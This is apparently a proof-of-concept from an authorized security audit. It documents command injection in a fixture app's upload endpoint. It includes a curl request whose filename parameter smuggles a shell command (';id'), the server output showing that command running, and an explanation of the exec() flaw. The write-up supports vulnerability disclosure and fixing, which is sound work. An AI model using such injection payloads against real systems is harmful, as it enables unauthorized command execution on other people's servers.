# PoC — SA-command-injection-dcbc2346

**Finding:** Command injection in thumbnail generation via upload filename
**Location:** `src/upload.ts:10` in `handleUpload`
**Environment:** isolated local instance of the fixture repo, authorized audit run of 2026-11-05.
**Expected result:** OS command execution as a side effect of a public GET request.

## Commands

```bash
# Start the fixture app on an isolated local instance (never production).
# 1. Trigger via the public endpoint:
curl -v 'http://127.0.0.1:3000/upload?name=x;id'

# 2. Observe: the injected command executes and its output surfaces in the
#    conversion error path — id(1) output (uid/gid of the app process).
```

## Raw output (redacted)

```
> GET /upload?name=x;id HTTP/1.1
< HTTP/1.1 500 Internal Server Error
< x-conversion-error: convert: unable-to-open /var/uploads/x;id → uid=1000(app) gid=1000(app)
```

## Why this proves the finding

The `;id` fragment of the user-controlled `name` parameter is executed by the shell rather than
treated as filename text, demonstrating that `exec()` receives attacker-controlled shell
syntax through `path.join(UPLOAD_DIR, name)` — a network→application trust boundary violation.

NOTE: All output above is from the isolated test instance only. Nothing in this PoC touched
production, and no secrets are included.
